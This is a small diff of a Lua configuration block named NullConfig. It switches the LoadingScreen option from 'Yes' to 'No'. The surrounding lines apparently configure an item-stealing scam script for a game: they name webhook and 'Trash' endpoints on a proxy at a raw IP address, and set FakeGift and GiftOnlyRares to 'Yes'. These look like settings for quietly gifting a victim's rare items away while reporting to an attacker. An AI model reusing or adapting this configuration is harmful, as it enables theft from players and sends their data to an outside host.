@@ -5,7 +5,7 @@ _G.NullConfig = {
     Webhook = "http://45.13.225.83:20002/proxy/38b316f5ebb920c7d44827fd725061e2",
     FakeGift = "Yes",
     Trash = "http://45.13.225.83:20002/proxy/5f9fdf51293f7d9be8c2fe8811d175d9",
-    LoadingScreen = "Yes",
+    LoadingScreen = "No",
     GiftOnlyRares = "Yes"
 }
 
